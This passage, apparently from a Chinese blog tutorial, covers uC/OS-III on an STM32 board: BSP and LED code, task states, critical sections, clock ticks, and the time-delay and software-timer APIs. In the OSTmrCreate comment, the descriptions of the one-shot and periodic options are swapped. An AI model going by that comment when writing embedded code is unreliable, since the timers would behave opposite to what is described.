<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">APP_TRACE_INFO</span>((<span class="string">&quot;Creating Application Tasks...\n\r&quot;</span>));</span><br><span class="line"><span class="built_in">AppTaskCreate</span>();                                            <span class="comment">/* Create Application Tasks                             */</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">APP_TRACE_INFO</span>((<span class="string">&quot;Creating Application Events...\n\r&quot;</span>));</span><br><span class="line"><span class="built_in">AppObjCreate</span>();                                             <span class="comment">/* Create Application Objects                           */</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">BSP_LED_Off</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>修改while中的部分；</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (DEF_TRUE) &#123; </span><br><span class="line">    <span class="built_in">Led_on</span>();</span><br><span class="line">    <span class="built_in">OSTimeDlyHMSM</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">100</span>,</span><br><span class="line">                    OS_OPT_TIME_HMSM_STRICT,</span><br><span class="line">                    &amp;err);</span><br><span class="line">    <span class="built_in">Led_off</span>();</span><br><span class="line">    <span class="built_in">OSTimeDlyHMSM</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">100</span>,</span><br><span class="line">                    OS_OPT_TIME_HMSM_STRICT,</span><br><span class="line">                    &amp;err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改<code>bsp.h</code>内容为：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span>  BSP_PRESENT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  BSP_PRESENT</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>   BSP_MODULE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  BSP_EXT</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  BSP_EXT  extern</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span>  <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span>  <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span>  <span class="string">&lt;cpu.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span>  <span class="string">&lt;cpu_core.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span>  <span class="string">&lt;lib_ascii.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span>  <span class="string">&lt;lib_def.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span>  <span class="string">&lt;lib_mem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span>  <span class="string">&lt;lib_str.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span>  <span class="string">&lt;stm32f10x.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span>  <span class="string">&lt;app_cfg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span>         <span class="title">BSP_Init</span>                    <span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"><span class="function">CPU_INT32U   <span class="title">BSP_CPU_ClkFreq</span>             <span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Led_on</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Led_off</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  </span></span><br></pre></td></tr></table></figure>

<p>修改<code>bsp.c</code>文件为：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span>  BSP_MODULE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bsp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">CPU_INT32U  BSP_CPU_ClkFreq_MHz;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  DWT_CR      *(CPU_REG32 *)0xE0001000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  DWT_CYCCNT  *(CPU_REG32 *)0xE0001004</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  DEM_CR      *(CPU_REG32 *)0xE000EDFC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  DBGMCU_CR   *(CPU_REG32 *)0xE0042004</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  DBGMCU_CR_TRACE_IOEN_MASK       0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  DBGMCU_CR_TRACE_MODE_ASYNC      0x00</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  DBGMCU_CR_TRACE_MODE_SYNC_01    0x40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  DBGMCU_CR_TRACE_MODE_SYNC_02    0x80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  DBGMCU_CR_TRACE_MODE_SYNC_04    0xC0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  DBGMCU_CR_TRACE_MODE_MASK       0xC0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  DEM_CR_TRCENA                   (1 &lt;&lt; 24)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  DWT_CR_CYCCNTENA                (1 &lt;&lt;  0)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BSP_Init</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	GPIO_InitTypeDef gpio;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">RCC_APB2PeriphClockCmd</span>(RCC_APB2Periph_GPIOA,ENABLE);</span><br><span class="line">	gpio.GPIO_Mode = GPIO_Mode_Out_PP;</span><br><span class="line">	gpio.GPIO_Speed = GPIO_Speed_50MHz;</span><br><span class="line">	gpio.GPIO_Pin = GPIO_Pin_2;</span><br><span class="line">	<span class="built_in">GPIO_Init</span>(GPIOA, &amp;gpio);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Led_on</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">GPIO_ResetBits</span>(GPIOA, GPIO_Pin_2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Led_off</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">GPIO_SetBits</span>(GPIOA, GPIO_Pin_2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">CPU_INT32U <span class="title">BSP_CPU_ClkFreq</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RCC_ClocksTypeDef  rcc_clocks;</span><br><span class="line">    <span class="built_in">RCC_GetClocksFreq</span>(&amp;rcc_clocks);</span><br><span class="line">    <span class="keyword">return</span> ((CPU_INT32U)rcc_clocks.HCLK_Frequency);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> (CPU_CFG_TS_TMR_EN == DEF_ENABLED)</span></span><br><span class="line"><span class="function"><span class="type">void</span>  <span class="title">CPU_TS_TmrInit</span> <span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CPU_INT32U  cpu_clk_freq_hz;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    DEM_CR         |= (CPU_INT32U)DEM_CR_TRCENA;                <span class="comment">/* Enable Cortex-M3&#x27;s DWT CYCCNT reg.                   */</span></span><br><span class="line">    DWT_CYCCNT      = (CPU_INT32U)<span class="number">0u</span>;</span><br><span class="line">    DWT_CR         |= (CPU_INT32U)DWT_CR_CYCCNTENA;</span><br><span class="line"></span><br><span class="line">    cpu_clk_freq_hz = <span class="built_in">BSP_CPU_ClkFreq</span>();</span><br><span class="line">    <span class="built_in">CPU_TS_TmrFreqSet</span>(cpu_clk_freq_hz);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> (CPU_CFG_TS_TMR_EN == DEF_ENABLED)</span></span><br><span class="line"><span class="function">CPU_TS_TMR  <span class="title">CPU_TS_TmrRd</span> <span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((CPU_TS_TMR)DWT_CYCCNT);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>接下来的开发将主要在<code>app.c</code>和<code>bsp.c</code>中了。</p>
<h3 id="系统综述"><a href="#系统综述" class="headerlink" title="系统综述"></a>系统综述</h3><p>在ucos-iii中，可以创建无数多个任务。另外，在初始化的时候，系统还会窗空闲任务OS_IdleTask()和时基任务OS_TickTask()，以及三个可选任务：软件定时器任务OS_TmrTaks()，中断延迟提交任务OS_IntQTask()和统计任务OS_StatTask()。</p>
<p>任务具有五种状态：</p>
<ul>
<li>休眠：声明但尚未创建，不受系统管理。</li>
<li>就绪：等待CPU使用权。</li>
<li>运行：正在运行。</li>
<li>等待：等待IO或某事件。</li>
<li>中断服务：进入中断函数。</li>
</ul>
<p>ucos-iii中对任务定义了9种状态：</p>
<ul>
<li>OS_TASK_STATE_RDY：就绪状态；</li>
<li>OS_TASK_STATE_DLY：延时状态；</li>
<li>OS_TASK_STATE_DEL：删除状态；</li>
<li>OS_TASK_STATE_SUSPENDED：挂起状态；</li>
<li>OS_TASK_STATE_PEND：无限期等待，直到某事件发生；</li>
<li>OS_TASK_STATE_PEND_TIMEOUT：有限期等待，超时则继续执行；</li>
<li>OS_TASK_STATE_DLY_SUSPENDED：在延时中被挂起；</li>
<li>OS_TASK_STATE_PEND_SUSPENDED：无限等待中被挂起；</li>
<li>OS_TASK_STATE_PEND_TIMEOUT_SUSPENDED：优先等待中被挂起</li>
</ul>
<p>另外，系统还提供软件定时器，多值信号量，互斥信号量，消息队列，事件标志组，任务信号量，消息队列，内存管理（分区）等功能。</p>
<h3 id="中断管理"><a href="#中断管理" class="headerlink" title="中断管理"></a>中断管理</h3><p>关闭中断（进入临界区）：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">OS_CRITICAL_ENTER</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OS_CRITICAL_ENTER_CPU_EXIT</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>

<p>开启中断（退出临界区）：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">OS_CRITICAL_EXIT</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OS_CRITICAL_EXIT_NO_SCHED</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>

<p>在进入中断服务函数后，应当调用函数将中断嵌套计数器加1，并在退出时减1。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 中断嵌套计数 + 1</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSIntEnter</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"><span class="comment">// 中断嵌套计数 - 1</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSIntExit</span> <span class="params">(<span class="type">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>



<h3 id="时钟节拍"><a href="#时钟节拍" class="headerlink" title="时钟节拍"></a>时钟节拍</h3><p>时钟节拍就是系统以固定的频率产生中断（时基中断），并在中断中处理与时间相关的事件，推动所有任务向前运行。时钟节拍需要依赖于硬件定时器，在STM32裸机程序中经常使用的<code>SysTick</code>时钟是MCU的内核定时器，通常都使用该定时器产生操作系统的时钟节拍。</p>
<p>用户需要先在<code>os_cfg_app.h</code>中设定时钟节拍的频率<code>OS_CFG_TICK_RATE_HZ</code>，该频率越高，操作系统检测事件就越频繁，可以增强任务的实时性，但太频繁也会增加操作系统内核的负担加重，所以用户需要权衡该频率的设置。一般采用1ms的设置，也就是1000Hz。</p>
<p>定时器的初始化是在<code>AppTaskStart()</code>函数中。在初始化过程中，会开启<code>SysTick</code>中断，同时在<code>SysTick</code>中断中会给<code>OS_TickTask()</code>任务发送信号量。<code>OS_TickTask()</code>任务收到信号量后就会进入就绪状态，准备运行。</p>
<p>在实际运行中，由软件产生的定时器效果精度较硬件定时器低，误差约在1%以内，一般该精度足够用了。</p>
<h3 id="时间管理"><a href="#时间管理" class="headerlink" title="时间管理"></a>时间管理</h3><p>时间管理的相关函数有：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">延时执行当前任务，延时结束后再回来执行当前任务。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_TIME_DLY Dly 为相对时间，就是从现在起延时多长时间， 到时钟节拍总计数OSTickCtr = OSTickCtr 当前+ dly 时延时结束。</span></span><br><span class="line"><span class="comment">OS_OPT_TIME_TIMEOUT 跟OS_OPT_TIME_DLY 情况一样。</span></span><br><span class="line"><span class="comment">OS_OPT_TIME_MATCH Dly 为绝对时间，就是从系统开始运行（调用OSStart()）时到节拍总计数OSTickCtr = dly 时延时结束。</span></span><br><span class="line"><span class="comment">OS_OPT_TIME_PERIODIC 周期性延时，跟OS_OPT_TIME_DLY差不多。如果是长时间延时，该选项更精准一些。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 没错误。</span></span><br><span class="line"><span class="comment">OS_ERR_OPT_INVALID 选项不可用。</span></span><br><span class="line"><span class="comment">OS_ERR_SCHED_LOCKED 调度器被锁</span></span><br><span class="line"><span class="comment">OS_ERR_TIME_DLY_ISR 在中断中使用该函数。</span></span><br><span class="line"><span class="comment">OS_ERR_TIME_ZERO_DLY Dly 为0。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSTimeDly</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TICK dly,    <span class="comment">// 延时的节拍数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,    </span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err  </span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">延时执行当前任务，延时结束后再回来执行当前任务。</span></span><br><span class="line"><span class="comment">开关：os_cfg.h\OS_CFG_TIME_DLY_HMSM_EN</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_TIME_DLY Dly 为相对时间，就是从现在起延时多长时间， 到时钟节拍总计数OSTickCtr = OSTickCtr 当前+ dly 时延时结束。</span></span><br><span class="line"><span class="comment">OS_OPT_TIME_TIMEOUT 跟OS_OPT_TIME_DLY 情况一样。</span></span><br><span class="line"><span class="comment">OS_OPT_TIME_MATCH Dly 为绝对时间，就是从系统开始运行（调用OSStart()）时到节拍总计数OSTickCtr = dly 时延时结束。</span></span><br><span class="line"><span class="comment">OS_OPT_TIME_PERIODIC 周期性延时，跟OS_OPT_TIME_DLY差不多。如果是长时间延时，该选项更精准一些。</span></span><br><span class="line"><span class="comment">OS_OPT_TIME_HMSM_STRICT 延时时间取值比较严格。</span></span><br><span class="line"><span class="comment">    hours (0...99)</span></span><br><span class="line"><span class="comment">    minutes (0...59)</span></span><br><span class="line"><span class="comment">    seconds (0...59)</span></span><br><span class="line"><span class="comment">    milliseconds (0...999)</span></span><br><span class="line"><span class="comment">OS_OPT_TIME_HMSM_NON_STRICT 延时时间取值比较宽松。</span></span><br><span class="line"><span class="comment">    hours (0...999)</span></span><br><span class="line"><span class="comment">    minutes (0...9999)</span></span><br><span class="line"><span class="comment">    seconds (0...65535)</span></span><br><span class="line"><span class="comment">    milliseconds (0...4294967295)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 没错误。</span></span><br><span class="line"><span class="comment">OS_ERR_OPT_INVALID 选项不可用。</span></span><br><span class="line"><span class="comment">OS_ERR_SCHED_LOCKED 调度器被锁</span></span><br><span class="line"><span class="comment">OS_ERR_TIME_DLY_ISR 在中断中使用该函数。</span></span><br><span class="line"><span class="comment">OS_ERR_TIME_INVALID_HOURS 小时数不可用。</span></span><br><span class="line"><span class="comment">OS_ERR_TIME_INVALID_MINUTES 分钟数不可用。</span></span><br><span class="line"><span class="comment">OS_ERR_TIME_INVALID_SECONDS 秒数不可用。</span></span><br><span class="line"><span class="comment">OS_ERR_TIME_INVALID_MILLISECONDS 毫秒数不可用。</span></span><br><span class="line"><span class="comment">OS_ERR_TIME_ZERO_DLY 延时时间为0。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSTimeDlyHMSM</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    CPU_INT16U hours,    <span class="comment">// 小时数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    CPU_INT16U minutes,  <span class="comment">// 分钟数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    CPU_INT16U seconds,  <span class="comment">// 秒数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    CPU_INT32U milli,    <span class="comment">// 毫秒数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">结束其他任务的延时。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 没错误。</span></span><br><span class="line"><span class="comment">OS_ERR_STATE_INVALID 任务状态非法。</span></span><br><span class="line"><span class="comment">OS_ERR_TIME_DLY_RESUME_ISR 在中断中结束延时。</span></span><br><span class="line"><span class="comment">OS_ERR_ TASK_NOT_DLY 任务不在延时。</span></span><br><span class="line"><span class="comment">OS_ERR_TASK_SUSPENDED 任务被挂起。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">开关：os_cfg.h\OS_CFG_TIME_DLY_RESUME_EN</span></span><br><span class="line"><span class="comment">该函数的p_tcb 参数不可以是当前任务。</span></span><br><span class="line"><span class="comment">不可以用该函数结束等待事件。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSTimeDlyResume</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TCB *p_tcb,  <span class="comment">// 任务的任务控制块指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">获取当前的时钟节拍计数值。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 没错误。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：当前的时钟节拍计数值。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">OS_TICK <span class="title">OSTimeGet</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">设置当前的时钟节拍计数值。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 没错误。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">该函数谨慎使用。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSTimeSet</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TICK ticks,   <span class="comment">// 时钟节拍数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>


<h3 id="软件定时器"><a href="#软件定时器" class="headerlink" title="软件定时器"></a>软件定时器</h3><p>软件定时器启动之后是由软件定时器任务<code>OS_TmrTask()</code>统一管理，在创建软件定时器之前必须先使能软件定时器和配置软件定时器的相关参数。</p>
<p>软件定时器开启位置：<code>os_cfg.h\OS_CFG_TMR_EN</code><br>软件定时器配置位置：<code>os_cpu_app.h\OS_CFG_TMR_TASK_PRIO</code></p>
<p>相应的API有：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">创建一个软件定时器。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_TMR_ONE_SHOT 周期性定时。</span></span><br><span class="line"><span class="comment">OS_OPT_TMR_PERIODIC 一次性定时。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 没错误</span></span><br><span class="line"><span class="comment">OS_ERR_ILLEGAL_CREATE_RUN_TIME 非法创建内核对象</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_CREATED 该定时器已被创建过</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_PTR_NULL 定时器对象为空</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_TYPE 定时器对象无效</span></span><br><span class="line"><span class="comment">OS_ERR_OPT_INVALID 选项不可用。</span></span><br><span class="line"><span class="comment">OS_ERR_TMR_INVALID_DLY 定时初始实参无效</span></span><br><span class="line"><span class="comment">OS_ERR_TMR_INVALID_PERIOD 周期重载实参无效</span></span><br><span class="line"><span class="comment">OS_ERR_TMR_ISR 在中断函数中定时</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">一次性定时时dly 不能为0。</span></span><br><span class="line"><span class="comment">周期性定时时period 不能为0。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OSTmrCreate</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TMR *p_tmr,          <span class="comment">// 定时器控制块指针。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    CPU_CHAR *p_name,       <span class="comment">// 定时器名称。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TICK dly,            <span class="comment">// 初始定时节拍数。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TICK period,         <span class="comment">// 周期定时重载节拍数。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TMR_CALLBACK_PTR p_callback,  <span class="comment">// 定时到期时的回调函数。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">void</span> *p_callback_arg,   <span class="comment">// 传给回调函数的参数。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err           </span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">启动一个软件定时器。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 没错误</span></span><br><span class="line"><span class="comment">OS_ERR_ILLEGAL_CREATE_RUN_TIME 非法创建内核对象</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_CREATED 该定时器已被创建过</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_PTR_NULL 定时器对象为空</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_TYPE 定时器对象无效</span></span><br><span class="line"><span class="comment">OS_ERR_OPT_INVALID 选项不可用。</span></span><br><span class="line"><span class="comment">OS_ERR_TMR_INVALID_DLY 定时初始实参无效</span></span><br><span class="line"><span class="comment">OS_ERR_TMR_INVALID_PERIOD 周期重载实参无效</span></span><br><span class="line"><span class="comment">OS_ERR_TMR_ISR 在中断函数中定时</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">DEF_TRUE，执行成功。</span></span><br><span class="line"><span class="comment">DEF_FALSE，执行失败。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">一次性定时时dly 不能为0。</span></span><br><span class="line"><span class="comment">周期性定时时period 不能为0。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function">CPU_BOOLEAN <span class="title">OSTmrStart</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TMR *p_tmr,        <span class="comment">// 定时器控制块指针。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">停止一个软件定时器。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">选项：</span></span><br><span class="line"><span class="comment">OS_OPT_TMR_NONE 只需停止定时器，不需执行指定事件。</span></span><br><span class="line"><span class="comment">OS_OPT_TMR_CALLBACK 停止定时器，并执行回调函数。</span></span><br><span class="line"><span class="comment">OS_OPT_TMR_CALLBACK_ARG 停止定时器，并执行回调函数，且将p_callback_arg 作为新实参。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 没错误</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_TYPE p_tmr 不是一个定时器指针</span></span><br><span class="line"><span class="comment">OS_ERR_OPT_INVALID opt 非法</span></span><br><span class="line"><span class="comment">OS_ERR_TMR_INACTIVE 定时器为被创建</span></span><br><span class="line"><span class="comment">OS_ERR_TMR_INVALID p_tmr 为空</span></span><br><span class="line"><span class="comment">OS_ERR_TMR_INVALID_STATE 定时器状态非法</span></span><br><span class="line"><span class="comment">OS_ERR_TMR_ISR 在中断中被调用</span></span><br><span class="line"><span class="comment">OS_ERR_TMR_NO_CALLBACK 定时器不存在回调函数</span></span><br><span class="line"><span class="comment">OS_ERR_TMR_STOPPED 定时器已被停止</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">DEF_TRUE ， 停止成功（ 包括定时器已被停止， 即错误类型为“OS_ERR_TMR_STOPPED”）。</span></span><br><span class="line"><span class="comment">DEF_FALSE，停止失败。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function">CPU_BOOLEAN <span class="title">OSTmrStop</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_TMR *p_tmr,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_OPT opt,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">void</span> *p_callback_arg,</span></span></span><br><span class="line"><span class="params"><span class="function">    OS_ERR *p_err</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">删除一个软件定时器。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">错误：</span></span><br><span class="line"><span class="comment">OS_ERR_NONE 没错误</span></span><br><span class="line"><span class="comment">OS_ERR_OBJ_TYPE p_tmr 不是一个定时器类型</span></span><br><span class="line"><span class="comment">OS_ERR_TMR_INVALID p_tmr 为空</span></span><br><span class="line"><span class="comment">OS_ERR_TMR_ISR 在中断中被调用</span></span><br><span class="line"><span class="comment">OS_ERR_TMR_INACTIVE 定时器未被创建过</span></span><br><span class="line"><span class="comment">OS_ERR_TMR_INVALID_STATE 定时器处于非法状态</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">DEF_TRUE，删除成功；</span></span><br><span class="line"><span 